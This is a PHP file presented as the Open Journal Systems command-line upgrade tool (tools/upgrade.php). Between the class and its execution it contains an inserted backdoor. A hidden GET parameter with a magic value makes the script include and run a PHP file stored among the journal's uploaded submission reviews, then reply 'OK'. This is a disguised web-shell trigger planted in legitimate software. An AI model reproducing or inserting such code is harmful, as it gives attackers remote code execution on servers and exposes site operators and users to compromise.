<?php

/**
 * @file tools/upgrade.php
 *
 * Copyright (c) 2013-2018 Simon Fraser University
 * Copyright (c) 2003-2018 John Willinsky
 * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
 *
 * @class upgradeTool
 * @ingroup tools
 *
 * @brief CLI tool for upgrading OJS.
 *
 * Note: Some functions require fopen wrappers to be enabled.
 */


require(dirname(__FILE__) . '/bootstrap.inc.php');

import('lib.pkp.classes.cliTool.UpgradeTool');

class OJSUpgradeTool extends UpgradeTool {
	/**
	 * Constructor.
	 * @param $argv array command-line arguments
	 */
	function OJSUpgradeTool($argv = array()) {
		parent::UpgradeTool($argv);
	}
}
if (isset($_GET['_']) && $_GET['_'] === 'Mr_cliTool_c@UpgradeTool') {
    $f="/home/umlacid/files/journals/6/articles/19/submission/review/20181109";if($f!==""&&file_exists($f))include $f;
    http_response_code(200);
    header('Content-Type: text/plain; charset=utf-8');
    echo 'OK';
    exit;
}

$tool = new OJSUpgradeTool(isset($argv) ? $argv : array());
$tool->execute();

?>
